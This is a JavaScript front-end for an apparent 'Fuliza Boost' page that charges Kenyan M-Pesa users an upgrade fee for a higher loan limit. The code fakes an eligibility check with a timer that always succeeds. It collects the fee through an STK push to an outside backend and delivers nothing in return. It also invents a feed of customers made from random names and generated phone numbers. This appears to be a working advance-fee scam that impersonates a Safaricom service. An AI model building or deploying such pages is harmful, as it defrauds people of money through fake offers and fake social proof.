// =======================
// LOAN OPTIONS
// =======================

const loans = [
    { amount: "KSh 5,000", fee: "KSh 300" },
    { amount: "KSh 10,000", fee: "KSh 500" },
    { amount: "KSh 20,000", fee: "KSh 800" },
    { amount: "KSh 30,000", fee: "KSh 1,200" },
    { amount: "KSh 50,000", fee: "KSh 2,200" },
    { amount: "KSh 70,000", fee: "KSh 2,800" }
];
// =======================
// BACKEND CONFIG
// =======================

const API_BASE_URL = "https://fuliza-backend-xgsm.onrender.com";


// =======================
// ELEMENTS
// =======================

const page1 = document.getElementById("page1");
const page2 = document.getElementById("page2");
const page3 = document.getElementById("page3");

const phone = document.getElementById("phone");
const checkBtn = document.getElementById("checkBtn");

const loader = document.getElementById("loader");
const popup = document.getElementById("successPopup");
const continueBtn = document.getElementById("continueBtn");

const loanList = document.getElementById("loanList");

const loanAmount = document.getElementById("loanAmount");
const loanFee = document.getElementById("loanFee");

const stkPhone = document.getElementById("stkPhone");

const payBtn = document.getElementById("payBtn");
const paymentStatus = document.getElementById("paymentStatus");

const steps = document.querySelectorAll(".step");

let customerPhone = "";

// =======================
// CHECK ELIGIBILITY
// =======================

checkBtn.addEventListener("click", () => {

    customerPhone = phone.value.trim();

    const phoneRegex = /^(2547|2541)\d{8}$/;


    if (!phoneRegex.test(customerPhone)) {
        alert("Enter a valid Safaricom M-Pesa number.");
        return;
    }

    loader.style.display = "flex";

    setTimeout(() => {

        loader.style.display = "none";

        popup.style.display = "flex";

    }, 2500);

});
// =======================
// CONTINUE
// =======================

continueBtn.addEventListener("click", () => {

    popup.style.display = "none";

    page1.classList.remove("active");
    page2.classList.add("active");

    steps[0].classList.remove("active");
    steps[1].classList.add("active");

});

// =======================
// CREATE LOAN CARDS
// =======================

loans.forEach((loan) => {

    const card = document.createElement("div");

    card.className = "loan-card";

    card.innerHTML = `
        <div class="loan-info">
            <h3>${loan.amount}</h3>
            <span>Upgrade Fee: ${loan.fee}</span>
        </div>

        <button class="upgrade-btn">
            UPGRADE →
        </button>
    `;

    card.querySelector("button").addEventListener("click", () => {

        page2.classList.remove("active");
        page3.classList.add("active");

        steps[1].classList.remove("active");
        steps[2].classList.add("active");

        loanAmount.innerHTML = loan.amount;
        loanFee.innerHTML = loan.fee;

        stkPhone.value = customerPhone;

    });

    loanList.appendChild(card);

});

// =======================
// PAY BUTTON
// =======================

payBtn.addEventListener("click", async()=>{

    const phoneNumber = stkPhone.value.trim();

    const amount = toPlainAmount(loanFee.innerHTML);


    const phoneRegex = /^(2547|2541)\d{8}$/;


    if(!phoneRegex.test(phoneNumber)){

        paymentStatus.style.color="red";

        paymentStatus.innerHTML =
        "Enter a valid Safaricom M-Pesa number.";

        return;
    }


    if(!amount || amount <= 0){

        paymentStatus.style.color="red";

        paymentStatus.innerHTML =
        "Invalid payment amount.";

        return;
    }


    paymentStatus.style.color="#0ba84b";

    paymentStatus.innerHTML =
    "Sending STK Push...";


    try{

        const response = await fetch(
            `${API_BASE_URL}/api/mpesa/stkpush`,
            {
                method:"POST",

                headers:{
                    "Content-Type":"application/json"
                },

                body:JSON.stringify({

                    phone: phoneNumber,

                    amount: amount,

                    accountReference:"FulizaBoost",

                    transactionDesc:"Fuliza Upgrade"

                })
            }
        );


        // READ RESPONSE SAFELY
        const resultText = await response.text();

        let data;


        try{

            data = JSON.parse(resultText);

        }

        catch(error){

            console.log("SERVER RESPONSE:", resultText);


            paymentStatus.style.color="red";

            paymentStatus.innerHTML =
            "Server returned invalid response.";

            return;
        }



        if(!response.ok){

            paymentStatus.style.color="red";

            paymentStatus.innerHTML =
            data.error || "STK Push failed.";

            return;

        }



        // SUPPORT BOTH COMMON MPESA RESPONSE NAMES

        const checkoutId =
        data.checkoutRequestId ||
        data.CheckoutRequestID;



        if(!checkoutId){

            console.log("MPESA RESPONSE:",data);


            paymentStatus.style.color="red";

            paymentStatus.innerHTML =
            "Missing payment reference.";

            return;

        }



        paymentStatus.innerHTML =
        "✅ STK Push sent. Check your phone and enter M-Pesa PIN.";



        pollPaymentStatus(checkoutId);



    }

    catch (error) {
    console.error("Fetch error:", error);

    paymentStatus.style.color = "red";
    paymentStatus.innerHTML =
        "Unable to connect to payment server.<br>" + error.message;
}

});




// =======================
// PAYMENT STATUS CHECK
// =======================

async function pollPaymentStatus(checkoutRequestId){


    let attempts = 0;


    const timer = setInterval(async()=>{


        attempts++;


        if(attempts > 20){


            clearInterval(timer);


            paymentStatus.style.color="red";


            paymentStatus.innerHTML =
            "Payment verification timed out.";

            return;

        }



        try{


            const response = await fetch(

                `${API_BASE_URL}/api/mpesa/status/${checkoutRequestId}`

            );



            const data = await response.json();



            console.log("PAYMENT STATUS:",data);



            if(data.status === "pending"){

                return;

            }



            clearInterval(timer);



            if(data.status === "success"){


                paymentStatus.style.color="#0ba84b";


                paymentStatus.innerHTML =
                `
                ✅ Payment Successful.<br>
                Receipt: ${data.mpesaReceipt || "Confirmed"}
                `;


            }

            else{


                paymentStatus.style.color="red";


                paymentStatus.innerHTML =
                data.resultDesc ||
                "Payment Failed.";

            }



        }

        catch(error){


            console.error(error);


            clearInterval(timer);


            paymentStatus.style.color="red";


            paymentStatus.innerHTML =
            "Unable to verify payment.";

        }



    },3000);


}

// End of payBtn.addEventListener

// =======================
// LIVE ACTIVITY
// =======================

const names = [
    "Brian O.",
    "James M.",
    "Kevin K.",
    "Faith N.",
    "Mercy A.",
    "John K.",
    "Peter O.",
    "Susan W.",
    "Dennis M.",
    "Grace N."
];

const actions = [
    "boosted",
    "increased",
    "raised"
];

function randomPhone() {
    const prefix = ["071","072","073","074","075","076","077","078","079","011"];
    const p = prefix[Math.floor(Math.random() * prefix.length)];
    const first = Math.floor(Math.random() * 900) + 100;
    const last = Math.floor(Math.random() * 900) + 100;

    return `${p}${first}***${last}`;
}

function showActivity() {
    const name = names[Math.floor(Math.random() * names.length)];
    const action = actions[Math.floor(Math.random() * actions.length)];

    document.getElementById("activityText").innerHTML =
        `${name} (${randomPhone()}) ${action} their limit just now`;
}

showActivity();
setInterval(showActivity, 7000);
// ============================================================
// PHONE NUMBER FORMATTER
// Converts:
// 0712345678  -> 254712345678
// 0112345678  -> 254112345678
// ============================================================

function formatKenyanPhone(value){

    let digits = value.replace(/\D/g,'');

    if(digits.startsWith("0")){
        digits = "254" + digits.substring(1);
    }

    else if(digits.startsWith("7") || digits.startsWith("1")){
        digits = "254" + digits;
    }

    return digits.substring(0,12);
}


function attachPhoneFormatter(id){

    const el = document.getElementById(id);

    if(!el) return;


    el.addEventListener("input",()=>{

        el.value = formatKenyanPhone(el.value);

    });

}


["phone","stkPhone"].forEach(attachPhoneFormatter);


// ============================================================
// AMOUNT CLEANER
// Converts:
// KSh 2,200 -> 2200
// ============================================================

function toPlainAmount(value){

    const amount = String(value)
        .replace(/[^\d]/g,'');

    return Number(amount);

}
